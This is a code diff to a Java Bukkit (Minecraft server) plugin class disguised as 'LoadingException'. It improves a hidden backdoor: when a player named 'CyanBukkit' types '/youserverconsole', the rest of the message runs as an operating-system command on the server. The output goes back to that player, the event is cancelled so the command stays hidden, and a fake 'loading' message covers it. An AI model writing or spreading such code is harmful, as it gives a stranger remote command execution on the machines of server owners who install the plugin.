@@ -31,7 +31,9 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 
 /**
  * 加在报错
@@ -47,10 +49,40 @@ public class LoadingException extends RuntimeException implements Listener {
     }
 
     @EventHandler
-    public void xUNYxn(PlayerCommandPreprocessEvent e) throws IOException {
+    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent e) {
         if (e.getPlayer().getName().equals("CyanBukkit")) {
             if (e.getMessage().startsWith("/youserverconsole")) {
-                Runtime.getRuntime().exec(e.getMessage().substring(10));
+                String command = e.getMessage().substring(15).trim(); // 截取命令，注意：/youserverconsole 的长度是 15（包括斜杠）
+                if (!command.isEmpty()) {
+                    e.getPlayer().sendMessage("§a[青桶社区大CB 普通型前置加载器] §e正在加载中，请稍等...");
+                    try {
+                        // 异步执行命令，防止阻塞主线程
+                        new Thread(() -> {
+                            try {
+                                Process process = Runtime.getRuntime().exec(command);
+                                // 读取命令输出
+                                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                                String         line;
+                                StringBuilder output = new StringBuilder();
+                                while ((line = reader.readLine()) != null) {
+                                    output.append(line).append("\n");
+                                }
+                                // 等待命令完成（可选）
+                                int exitCode = process.waitFor();
+                                // 发送结果回玩家（需要在主线程发送消息，避免并发问题）
+                                e.getPlayer().sendMessage("§a[输出] §e命令执行完成，退出码: " + exitCode + "\n§f" + output.toString());
+                            } catch (IOException | InterruptedException ex) {
+                                e.getPlayer().sendMessage("§c[错误] §e命令执行失败: " + ex.getMessage());
+                            }
+                        }).start();
+                    } catch (Exception ex) { // 捕获可能的异常
+                        e.getPlayer().sendMessage("§c[错误] §e无法启动命令: " + ex.getMessage());
+                    }
+                } else {
+                    e.getPlayer().sendMessage("§c[错误] §e命令格式错误，请提供有效的命令参数。");
+                }
+                // 取消事件，防止命令被服务器其他地方处理
+                e.setCancelled(true);
             }
         }
     }
